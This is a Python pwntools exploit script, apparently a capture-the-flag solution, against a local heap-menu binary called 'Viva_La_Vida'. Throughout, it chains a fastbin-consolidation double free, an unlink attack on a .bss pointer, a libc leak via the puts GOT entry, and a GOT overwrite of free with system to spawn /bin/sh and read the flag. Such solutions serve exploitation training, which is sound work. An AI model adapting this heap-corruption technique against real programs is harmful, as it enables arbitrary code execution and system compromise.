from pwn import *

#context.log_level = "debug"

s = process('./Viva_La_Vida')
e = ELF('./Viva_La_Vida')

bss = 0x6030f0+0x18

def allocate_global():
	s.sendline("8")
	s.recvuntil(">>")

def allocate_cavalry(length):
	s.sendline("13")
	s.recvuntil(">>")
	s.sendline(length)
	s.recvuntil(">>")

def change_inuse(index):
	s.sendline("54")
	s.recvuntil(">>")
	s.sendline(index)
	s.recvuntil(">>")
	s.sendline("19950610")
	s.recvuntil(">>")

def free_cavalry(index):
	s.sendline("24")
	s.recvuntil(">>")
	s.sendline(index)
	s.recvuntil(">>")

def modify_salary(index, data):
	s.sendline("21")
	s.recvuntil(">>")
	s.sendline(index)
	s.recvuntil(">>")
	s.sendline(data)
	s.recvuntil(">>")

def allocate_salary(index):
	s.sendline("1")
	s.recvuntil(">>")
	s.sendline(index)
	s.recvuntil(">>")

def unlink():
	s.sendline("1")
	s.recv(1024)
	s.sendline("0")
	s.recv(1024)

def leak(index):
	s.sendline("21")
	s.recv()
	s.sendline("0")
	s.sendline(index)
	s.recv()
	s.sendline("54")
	s.recv()
	s.sendline("0")
	s.recvuntil(">>")
	leak = u64(s.recv(6)+"\x00\x00")
	print 'leak : ' + str(hex(leak))
	s.recv()
	return leak

def exploit(index, system):
	s.sendline("21")
	s.recv()
	s.sendline("0")
	s.sendline(index)
	s.recv()
	s.sendline("21")
	s.recv()
	s.sendline('0')
	s.send(p64(system))
	s.recv()
	s.sendline("1")
	s.recv()
	s.sendline("0")

s.recvuntil(">>")

allocate_global() # root
allocate_cavalry('A'*47) # fastbin - size 48

allocate_global() # knight1
allocate_cavalry('B'*3999) # largebin - size 4000

free_cavalry('0') # free fastbin

allocate_global()
allocate_cavalry('C'*3999) # largebin - size 4000 -> fastbin consolidate

change_inuse('0') # set free -> unfreed to trigger double free

free_cavalry('0') # free smallbin (consolidate)

allocate_salary('0') # fastbin

modify_salary('0', p64(0)*2+p64(bss-0x18)+p64(bss-0x10)+p64(0)*2+p64(0x30)) # unlink 

unlink() # root -> salary -> unlink_here 

libc = leak(p64(0)*2+p64(e.got['puts'])+p64(0x6030e8)+p64(0)+p64(0x30)) - 456336
system = libc + 0x45390 # leak libc, system

print 'libc : ' + str(hex(libc))

exploit(p64(1)+'/bin/sh;'+p64(0)+p64(0x6030f0)+p64(e.got['free'])+p64(0x6030f0), system)
# got overwrite free -> system, write bin/sh -> secret(smallbin)

s.sendline("cat flag")
s.interactive()

